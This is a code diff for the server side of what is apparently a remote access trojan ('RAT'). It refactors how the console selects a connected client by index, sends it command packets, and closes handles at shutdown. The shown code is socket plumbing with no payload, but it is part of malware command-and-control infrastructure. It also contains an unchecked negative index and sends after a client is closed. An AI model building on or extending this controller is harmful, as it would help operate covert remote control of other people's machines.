@@ -161,8 +161,9 @@ static void handle_clients(Server *server) {
     }
     fgets(server_buf, sizeof(server_buf), stdin);
     int index = atoi(server_buf);
-    SOCKET *client = &server->clients[index].conn;
-    if (index >= MAX_CLIENTS || *client == INVALID_SOCKET) {
+    Client *client = server->clients + index;
+    SOCKET *conn = &server->clients[index].conn;
+    if (index >= MAX_CLIENTS || *conn == INVALID_SOCKET) {
       LOG_ERR("client %d doesn't exist", index);
       continue;
     }
@@ -171,18 +172,18 @@ static void handle_clients(Server *server) {
       continue;
     }
     if (p->op == RAT_PACKET_DISCONNECT) {
-      if (shutdown(*client, SD_SEND) == SOCKET_ERROR) {
+      if (shutdown(*conn, SD_SEND) == SOCKET_ERROR) {
         LOG_ERR("shutdown failed, error: %d", WSAGetLastError());
       }
       close_client(client);
     }
-    if (send(*client, (char *)p, sizeof(*p), 0) == SOCKET_ERROR) {
+    if (send(*conn, (char *)p, sizeof(*p), 0) == SOCKET_ERROR) {
       LOG_ERR("send rat header failed with %d", WSAGetLastError());
       close_client(client);
     }
     if (!p->data_len)
       continue;
-    if (send(*client, (char *)p->data, p->data_len, 0) == SOCKET_ERROR) {
+    if (send(*conn, (char *)p->data, p->data_len, 0) == SOCKET_ERROR) {
       LOG_ERR("send rat data failed with %d", WSAGetLastError());
       close_client(client);
     }
@@ -193,6 +194,7 @@ static void handle_clients(Server *server) {
     allocated = 0;
   }
   LOG_DEBUG("shutting down");
+  CloseHandle(client_handler);
 }
 
 int main() {
@@ -213,6 +215,9 @@ int main() {
   handle_clients(&server);
 exit:
   closesocket(server.conn);
+  for (int i = 0; i < MAX_CLIENTS; i++) {
+    CloseHandle(server.clients[i].handler);
+  }
   WSACleanup();
   return 0;
 }
